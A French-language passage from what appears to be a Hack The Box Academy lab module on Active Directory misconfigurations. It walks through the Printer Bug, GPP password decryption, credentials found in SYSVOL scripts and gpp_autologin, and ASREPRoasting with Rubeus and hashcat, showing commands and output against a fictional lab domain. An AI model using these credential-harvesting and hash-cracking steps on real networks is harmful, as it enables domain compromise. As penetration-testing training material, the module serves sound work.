Diverses erreurs de configuration
=================================

* * * * *

Il existe de nombreuses autres attaques et erreurs de configuration intéressantes que nous pouvons rencontrer lors d'une évaluation. Une compréhension globale des tenants et aboutissants de la MA nous aidera à sortir des sentiers battus et à découvrir des problèmes que d'autres risquent de manquer.

* * * * *

Configuration du scénario
-------------------------

Dans cette section, nous allons alterner entre un hôte d'attaque Windows et Linux au fur et à mesure que nous étudions les différents exemples. Vous pouvez générer les hôtes de cette section à la fin de cette section et RDP dans l'hôte d'attaque Windows MS01. Pour les parties de cette section qui nécessitent une interaction d'un hôte Linux, vous pouvez ouvrir une console PowerShell sur MS01 et SSH avec `172.16.5.225`les informations d'identification `htb-student:HTB_@cademy_stdnt!`.

* * * * *

Adhésion à un groupe lié à Exchange
-----------------------------------

Une installation par défaut de Microsoft Exchange dans un environnement AD (sans modèle d'administration fractionnée) ouvre de nombreux vecteurs d'attaque, car Exchange bénéficie souvent de privilèges considérables au sein du domaine (via les utilisateurs, les groupes et les ACL). Le groupe `Exchange Windows Permissions`n'est pas répertorié comme groupe protégé, mais les membres ont la possibilité d'écrire une DACL sur l'objet de domaine. Cela peut être exploité pour accorder à un utilisateur des privilèges DCSync. Un attaquant peut ajouter des comptes à ce groupe en exploitant une mauvaise configuration DACL (possible) ou en exploitant un compte compromis membre du groupe Opérateurs de compte. Il est courant de trouver des comptes d'utilisateurs et même des ordinateurs comme membres de ce groupe. Les utilisateurs expérimentés et le personnel d'assistance des bureaux distants sont souvent ajoutés à ce groupe, ce qui leur permet de réinitialiser les mots de passe. Ce [référentiel GitHub](https://github.com/gdedrouas/Exchange-AD-Privesc) détaille quelques techniques permettant d'exploiter Exchange pour élever les privilèges dans un environnement AD.

Le groupe Exchange `Organization Management`est un autre groupe extrêmement puissant (en fait les « Administrateurs de domaine » d'Exchange) et peut accéder aux boîtes aux lettres de tous les utilisateurs du domaine. Il n'est pas rare que des administrateurs système soient membres de ce groupe. Ce groupe a également le contrôle total de l'unité d'organisation appelée `Microsoft Exchange Security Groups`qui contient le groupe `Exchange Windows Permissions`.

#### Affichage des autorisations de gestion de l'organisation

![image](https://academy.hackthebox.com/storage/modules/143/org_mgmt_perms.png)

Si nous pouvons compromettre un serveur Exchange, cela conduira souvent à des privilèges d'administrateur de domaine. De plus, le vidage des informations d'identification en mémoire à partir d'un serveur Exchange produira 10, voire 100 secondes d'informations d'identification en texte clair ou de hachages NTLM. Cela est souvent dû au fait que les utilisateurs se connectant à Outlook Web Access (OWA) et Exchange mettent en cache leurs informations d'identification en mémoire après une connexion réussie.

* * * * *

Échange privé
-------------

L' `PrivExchange`attaque résulte d'une faille dans la `PushSubscription`fonctionnalité Exchange Server, qui permet à tout utilisateur de domaine disposant d'une boîte aux lettres de forcer le serveur Exchange à s'authentifier auprès de n'importe quel hôte fourni par le client via HTTP.

Le service Exchange s'exécute en tant que SYSTEM et est surprivilégié par défaut (c'est-à-dire qu'il dispose des privilèges WriteDacl sur le domaine avant la mise à jour cumulative 2019). Cette faille peut être exploitée pour relayer vers LDAP et vider la base de données NTDS du domaine. Si nous ne pouvons pas assurer le relais vers LDAP, cela peut être exploité pour relayer et authentifier auprès d'autres hôtes du domaine. Cette attaque vous mènera directement à l'administrateur de domaine avec n'importe quel compte d'utilisateur de domaine authentifié.

* * * * *

Bogue de l'imprimante
---------------------

Le Printer Bug est une faille du protocole MS-RPRN (Print System Remote Protocol). Ce protocole définit la communication du traitement des travaux d'impression et de la gestion du système d'impression entre un client et un serveur d'impression. Pour exploiter cette faille, n'importe quel utilisateur de domaine peut se connecter au canal nommé du spool avec la `RpcOpenPrinter`méthode et utiliser la `RpcRemoteFindFirstPrinterChangeNotificationEx`méthode, et forcer le serveur à s'authentifier auprès de n'importe quel hôte fourni par le client via SMB.

Le service spooler s'exécute en tant que SYSTEM et est installé par défaut sur les serveurs Windows exécutant Desktop Experience. Cette attaque peut être exploitée pour relayer vers LDAP et accorder à votre compte attaquant les privilèges DCSync pour récupérer tous les hachages de mot de passe d'AD.

L'attaque peut également être utilisée pour relayer l'authentification LDAP et accorder à la victime des privilèges de délégation contrainte basée sur les ressources (RBCD) sur un compte d'ordinateur sous notre contrôle, donnant ainsi à l'attaquant les privilèges de s'authentifier en tant qu'utilisateur sur l'ordinateur de la victime. Cette attaque peut être exploitée pour compromettre un contrôleur de domaine dans un domaine/forêt partenaire, à condition que vous disposiez déjà d'un accès administratif à un contrôleur de domaine dans la première forêt/domaine et que la confiance autorise la délégation TGT, ce qui n'est plus le cas par défaut.

Nous pouvons utiliser des outils tels que le `Get-SpoolStatus`module de [cet](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) outil (qui se trouve sur la cible générée) ou [cet](https://github.com/NotMedic/NetNTLMtoSilverTicket) outil pour rechercher les machines vulnérables au [bug d'imprimante MS-PRN](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability) . Cette faille peut être utilisée pour compromettre un hôte dans une autre forêt pour laquelle la délégation sans contrainte est activée, comme un contrôleur de domaine. Cela peut nous aider à attaquer à travers les fiducies forestières une fois que nous avons compromis une forêt.

#### Énumération du bogue de l'imprimante MS-PRN

  Diverses erreurs de configuration

```
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True

```

* * * * *

MS14-068
--------

Il s'agissait d'une faille dans le protocole Kerberos, qui pouvait être exploitée avec les informations d'identification standard des utilisateurs de domaine pour élever les privilèges de l'administrateur de domaine. Un ticket Kerberos contient des informations sur un utilisateur, notamment le nom du compte, l'ID et l'appartenance au groupe dans le certificat d'attribut de privilège (PAC). Le PAC est signé par le KDC à l'aide de clés secrètes pour valider que le PAC n'a pas été falsifié après sa création.

Cette vulnérabilité a permis à un faux PAC d'être accepté par le KDC comme légitime. Cela peut être exploité pour créer un faux PAC, présentant un utilisateur comme membre des administrateurs de domaine ou d'un autre groupe privilégié. Il peut être exploité avec des outils tels que le [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) ou la boîte à outils Impacket. La seule défense contre cette attaque consiste à appliquer des correctifs. La machine [Mantis](https://app.hackthebox.com/machines/98) sur la plateforme Hack The Box met en avant cette vulnérabilité.

* * * * *

Renifler les informations d'identification LDAP
-----------------------------------------------

De nombreuses applications et imprimantes stockent les informations d'identification LDAP dans leur console d'administration Web pour se connecter au domaine. Ces consoles se retrouvent souvent avec des mots de passe faibles ou par défaut. Parfois, ces informations d'identification peuvent être visualisées en texte clair. D'autres fois, l'application dispose d'une `test connection`fonction que nous pouvons utiliser pour recueillir des informations d'identification en remplaçant l'adresse IP LDAP par celle de notre hôte d'attaque et en configurant un `netcat`écouteur sur le port LDAP 389. Lorsque l'appareil tente de tester la connexion LDAP, il enverra les informations d'identification de notre machine, souvent en texte clair. Les comptes utilisés pour les connexions LDAP sont souvent privilégiés, mais dans le cas contraire, cela pourrait servir de premier point d'ancrage dans le domaine. D'autres fois, un serveur LDAP complet est nécessaire pour mener à bien cette attaque, comme détaillé dans cet [article](https://grimhacker.com/2018/03/09/just-a-printer/) .

* * * * *

Énumération des enregistrements DNS
-----------------------------------

Nous pouvons utiliser un outil tel [qu'adidnsdump](https://github.com/dirkjanm/adidnsdump) pour énumérer tous les enregistrements DNS d'un domaine à l'aide d'un compte d'utilisateur de domaine valide. Ceci est particulièrement utile si la convention de dénomination des hôtes nous est revenue lors de notre énumération à l'aide d'outils tels que `BloodHound`est similaire à `SRV01934.INLANEFREIGHT.LOCAL`. Si tous les serveurs et postes de travail portent un nom non descriptif, il nous est difficile de savoir exactement quoi attaquer. Si nous pouvons accéder aux entrées DNS dans AD, nous pouvons potentiellement découvrir des enregistrements DNS intéressants pointant vers ce même serveur, tels que `JENKINS.INLANEFREIGHT.LOCAL`, que nous pouvons utiliser pour mieux planifier nos attaques.

L'outil fonctionne car, par défaut, tous les utilisateurs peuvent lister les objets enfants d'une zone DNS dans un environnement AD. Par défaut, l'interrogation des enregistrements DNS à l'aide de LDAP ne renvoie pas tous les résultats. Ainsi, en utilisant l' `adidnsdump`outil, nous pouvons résoudre tous les enregistrements de la zone et potentiellement trouver quelque chose d'utile pour notre engagement. Le contexte et une explication plus approfondie de cet outil et de cette technique peuvent être trouvés dans cet [article](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/) .

Lors de la première exécution de l'outil, nous pouvons constater que certains enregistrements sont vides, à savoir `?,LOGISTICS,?`.

#### Utiliser Adidnsdump

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

Password:

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records

```

#### Affichage du contenu du fichier records.csv

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ head records.csv

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29

```

Si nous réexécutons avec l' `-r`indicateur, l'outil tentera de résoudre les enregistrements inconnus en effectuant une `A`requête. Nous pouvons maintenant voir qu'une adresse IP est `172.16.5.240`apparue pour la LOGISTIQUE. Bien qu'il s'agisse d'un petit exemple, cela vaut la peine d'exécuter cet outil dans des environnements plus vastes. Nous pouvons découvrir des enregistrements « cachés » qui peuvent conduire à la découverte d'hôtes intéressants.

#### Utilisation de l'option -r pour résoudre les enregistrements inconnus

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password:

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records

```

#### Recherche d'enregistrements masqués dans le fichier records.csv

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ head records.csv

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29

```

* * * * *

Autres mauvaises configurations
-------------------------------

Il existe de nombreuses autres erreurs de configuration qui peuvent être utilisées pour améliorer votre accès au sein d'un domaine.

* * * * *

### Mot de passe dans le champ de description

Des informations sensibles telles que les mots de passe des comptes se trouvent parfois dans le compte `Description`ou `Notes`les champs de l'utilisateur et peuvent être rapidement énumérées à l'aide de PowerView. Pour les grands domaines, il est utile d'exporter ces données vers un fichier CSV pour les consulter hors ligne.

#### Recherche de mots de passe dans le champ de description à l'aide de l'utilisateur Get-Domain

  Diverses erreurs de configuration

```
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!

```

* * * * *

Champ PASSWD_NOTREQD
--------------------

Il est possible de rencontrer des comptes de domaine avec le champ [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) défini dans l'attribut userAccountControl. Si cette option est définie, l'utilisateur n'est pas soumis à la longueur actuelle de la politique de mot de passe, ce qui signifie qu'il peut avoir un mot de passe plus court ou aucun mot de passe du tout (si les mots de passe vides sont autorisés dans le domaine). Un mot de passe peut être défini comme vide intentionnellement (parfois les administrateurs ne veulent pas être appelés en dehors des heures d'ouverture pour réinitialiser les mots de passe des utilisateurs) ou en appuyant accidentellement sur Entrée avant de saisir un mot de passe lors de sa modification via la ligne de commande. Ce n'est pas parce que cet indicateur est défini sur un compte qu'aucun mot de passe n'est défini, mais simplement qu'il n'est pas nécessaire d'en avoir un. Il existe de nombreuses raisons pour lesquelles cet indicateur peut être défini sur un compte utilisateur, l'une étant qu'un produit fournisseur a défini cet indicateur sur certains comptes au moment de l'installation et n'a jamais supprimé l'indicateur après l'installation. Cela vaut la peine d'énumérer les comptes avec cet indicateur et de tester chacun pour voir si aucun mot de passe n'est requis (je l'ai vu plusieurs fois lors d'évaluations). Incluez-le également dans le rapport du client si l'objectif de l'évaluation est d'être aussi complet que possible.

#### Vérification du paramètre PASSWD_NOTREQD à l'aide de Get-DomainUser

  Diverses erreurs de configuration

```
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT

```

* * * * *

Informations d'identification dans les partages SMB et les scripts SYSVOL
-------------------------------------------------------------------------

Le partage SYSVOL peut être un trésor de données, notamment dans les grandes organisations. Nous pouvons trouver de nombreux scripts batch, VBScript et PowerShell différents dans le répertoire des scripts, qui est lisible par tous les utilisateurs authentifiés du domaine. Cela vaut la peine de fouiller dans ce répertoire pour rechercher les mots de passe stockés dans les scripts. Parfois, nous trouverons de très anciens scripts contenant des comptes désactivés ou d'anciens mots de passe, mais de temps en temps, nous trouverons de l'or, nous devrions donc toujours fouiller dans ce répertoire. Ici, nous pouvons voir un script intéressant nommé `reset_local_admin_pass.vbs`.

#### Découvrir un script intéressant

  Diverses erreurs de configuration

```
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/18/2021  10:44 AM            174 daily-runs.zip
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs

```

En examinant de plus près le script, nous voyons qu'il contient un mot de passe pour l'administrateur local intégré sur les hôtes Windows. Dans ce cas, il serait utile de vérifier si ce mot de passe est toujours défini sur des hôtes du domaine. Nous pourrions le faire en utilisant CrackMapExec et le `--local-auth`drapeau comme indiqué dans la `Internal Password Spraying - from Linux`section de ce module.

#### Trouver un mot de passe dans le script

  Diverses erreurs de configuration

```
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."

Set oShell = CreateObject("WScript.Shell")
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"

Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if

'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>

```

* * * * *

Mots de passe des préférences de stratégie de groupe (GPP)
----------------------------------------------------------

Lorsqu'un nouveau GPP est créé, un fichier .xml est créé dans le partage SYSVOL, qui est également mis en cache localement sur les points de terminaison auxquels la stratégie de groupe s'applique. Ces fichiers peuvent inclure ceux utilisés pour :

-   Mapper les lecteurs (drives.xml)
-   Créer des utilisateurs locaux
-   Créer des fichiers de configuration d'imprimante (printers.xml)
-   Création et mise à jour de services (services.xml)
-   Création de tâches planifiées (scheduledtasks.xml)
-   Modification des mots de passe de l'administrateur local.

Ces fichiers peuvent contenir un ensemble de données de configuration et des mots de passe définis. La `cpassword`valeur de l'attribut est cryptée en AES-256 bits, mais Microsoft [a publié la clé privée AES sur MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) , qui peut être utilisée pour déchiffrer le mot de passe. Tout utilisateur de domaine peut lire ces fichiers lorsqu'ils sont stockés sur le partage SYSVOL, et tous les utilisateurs authentifiés d'un domaine ont, par défaut, un accès en lecture à ce partage de contrôleur de domaine.

Cela a été corrigé en 2014 [MS14-025. Une vulnérabilité dans GPP pourrait permettre une élévation de privilèges](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30) , pour empêcher les administrateurs de définir des mots de passe à l'aide de GPP. Le correctif ne supprime pas les fichiers Groups.xml existants avec les mots de passe de SYSVOL. Si vous supprimez la stratégie GPP au lieu de la dissocier de l'unité d'organisation, la copie mise en cache sur l'ordinateur local est conservée.

Le XML ressemble à ce qui suit :

#### Affichage des groupes.xml

![image](https://academy.hackthebox.com/storage/modules/143/GPP.png)

Si vous récupérez la valeur cpassword plus manuellement, l' `gpp-decrypt`utilitaire peut être utilisé pour déchiffrer le mot de passe comme suit :

#### Décrypter le mot de passe avec gpp-decrypt

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1

```

Les mots de passe GPP peuvent être localisés en recherchant ou en parcourant manuellement le partage SYSVOL ou en utilisant des outils tels que [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) , le module de publication GPP Metasploit et d'autres scripts Python/Ruby qui localiseront le GPP et renverront la valeur cpassword déchiffrée. CrackMapExec dispose également de deux modules pour localiser et récupérer les mots de passe GPP. Un petit conseil à prendre en compte lors des engagements : souvent, les mots de passe GPP sont définis pour les comptes existants, et vous pouvez donc récupérer et déchiffrer le mot de passe d'un compte verrouillé ou supprimé. Cependant, cela vaut la peine d'essayer de pulvériser un mot de passe en interne avec ce mot de passe (surtout s'il est unique). La réutilisation des mots de passe est répandue, et le mot de passe GPP combiné à la pulvérisation de mots de passe pourrait entraîner un accès supplémentaire.

#### Localiser et récupérer des mots de passe GPP avec CrackMapExec

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

```

Il est également possible de trouver des mots de passe dans des fichiers tels que Registry.xml lorsque la connexion automatique est configurée via la stratégie de groupe. Cela peut être configuré pour un certain nombre de raisons pour qu'une machine se connecte automatiquement au démarrage. Si cela est défini via la stratégie de groupe et non localement sur l'hôte, alors n'importe qui sur le domaine peut récupérer les informations d'identification stockées dans le fichier Registry.xml créé à cet effet. Il s'agit d'un problème distinct des mots de passe GPP, car Microsoft n'a pris aucune mesure pour bloquer le stockage de ces informations d'identification sur le SYSVOL en texte clair et, par conséquent, sont lisibles par tout utilisateur authentifié dans le domaine. Nous pouvons rechercher cela en utilisant CrackMapExec avec le module [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) ou en utilisant le script [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) inclus dans PowerSploit.

#### Utilisation du module gpp_autologin de CrackMapExec

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']

```

Dans le résultat ci-dessus, nous pouvons voir que nous avons récupéré les informations d'identification d'un compte appelé `guarddesk`. Cela peut avoir été configuré de manière à ce que les postes de travail partagés utilisés par les gardes se connectent automatiquement au démarrage pour accueillir plusieurs utilisateurs tout au long de la journée et de la nuit travaillant sur des équipes différentes. Dans ce cas, les informations d'identification sont probablement celles d'un administrateur local, il vaudrait donc la peine de trouver des hôtes sur lesquels nous pouvons nous connecter en tant qu'administrateur et rechercher des données supplémentaires. Parfois, nous pouvons découvrir les informations d'identification d'un utilisateur hautement privilégié ou les informations d'identification d'un compte désactivé/un mot de passe expiré qui ne nous est d'aucune utilité.

Un thème que nous abordons tout au long de ce module est la réutilisation des mots de passe. Une mauvaise hygiène des mots de passe est courante dans de nombreuses organisations. Ainsi, chaque fois que nous obtenons des informations d'identification, nous devons vérifier si nous pouvons les utiliser pour accéder à d'autres hôtes (en tant que domaine ou utilisateur local), exploiter des droits tels que des ACL intéressantes, accéder aux partages ou utilisez le mot de passe dans une attaque par pulvérisation de mot de passe pour découvrir la réutilisation du mot de passe et peut-être un compte qui nous accorde un accès supplémentaire à notre objectif.

* * * * *

ASREPRôtissage
--------------

Il est possible d'obtenir le Ticket Granting Ticket (TGT) pour tout compte pour lequel le paramètre [Ne pas exiger la pré-authentification Kerberos](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) est activé. De nombreux guides d'installation de fournisseurs précisent que leur compte de service doit être configuré de cette manière. La réponse du service d'authentification (AS_REP) est cryptée avec le mot de passe du compte et tout utilisateur du domaine peut la demander.

Avec la pré-authentification, un utilisateur saisit son mot de passe, qui crypte un horodatage. Le contrôleur de domaine le déchiffrera pour valider que le mot de passe correct a été utilisé. En cas de succès, un TGT sera émis à l'utilisateur pour d'autres demandes d'authentification dans le domaine. Si la pré-authentification d'un compte est désactivée, un attaquant peut demander des données d'authentification pour le compte concerné et récupérer un TGT crypté auprès du contrôleur de domaine. Celui-ci peut être soumis à une attaque de mot de passe hors ligne à l'aide d'un outil tel que Hashcat ou John the Ripper.

#### Affichage d'un compte avec l'option Ne pas nécessiter de pré-authentification Kerberos

![image](https://academy.hackthebox.com/storage/modules/143/preauth_not_reqd_mmorgan.png)

ASREPRoasting est similaire à Kerberoasting, mais il implique d'attaquer l'AS-REP au lieu du TGS-REP. Un SPN n'est pas requis. Ce paramètre peut être énuméré avec PowerView ou des outils intégrés tels que le module PowerShell AD.

L'attaque elle-même peut être réalisée avec la boîte à outils [Rubeus](https://github.com/GhostPack/Rubeus) et d'autres outils pour obtenir le ticket pour le compte cible. Si un attaquant dispose `GenericWrite`d' `GenericAll`autorisations sur un compte, il peut activer cet attribut et obtenir le ticket AS-REP pour le piratage hors ligne afin de récupérer le mot de passe du compte avant de désactiver à nouveau l'attribut. Comme Kerberoasting, le succès de cette attaque dépend du fait que le compte dispose d'un mot de passe relativement faible.

Vous trouverez ci-dessous un exemple de l'attaque. PowerView peut être utilisé pour énumérer les utilisateurs avec leur valeur UAC définie sur `DONT_REQ_PREAUTH`.

#### Énumération de la valeur DONT_REQ_PREAUTH à l'aide de Get-DomainUser

  Diverses erreurs de configuration

```
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

```

Avec ces informations en main, l'outil Rubeus peut être exploité pour récupérer l'AS-REP dans le format approprié pour le craquage de hachage hors ligne. Cette attaque ne nécessite aucun contexte d'utilisateur de domaine et peut être effectuée simplement en connaissant le nom SAM de l'utilisateur sans pré-authentification Kerberos. Nous en verrons un exemple utilisant Kerbrute plus loin dans cette section. N'oubliez pas d'ajouter l' `/nowrap`indicateur afin que le ticket ne soit pas renvoyé dans les colonnes et soit récupéré dans un format que nous pouvons facilement insérer dans Hashcat.

#### Récupération d'AS-REP dans le format approprié à l'aide de Rubeus

  Diverses erreurs de configuration

```
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA

```

Nous pouvons ensuite cracker le hachage hors ligne en utilisant Hashcat avec le mode `18200`.

#### Cracker le hachage hors ligne avec Hashcat

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10506240/14344385 (73.24%)
Rejected.........: 0/10506240 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: WellHelloNow -> W14233LTKM

Started: Fri Apr  1 13:18:37 2022
Stopped: Fri Apr  1 13:18:55 2022

```

Lors de l'énumération des utilisateurs avec `Kerbrute`, l'outil récupère automatiquement l'AS-REP pour tous les utilisateurs trouvés qui ne nécessitent pas de pré-authentification Kerberos.

#### Récupération de l'AS-REP à l'aide de Kerbrute

  Diverses erreurs de configuration

```
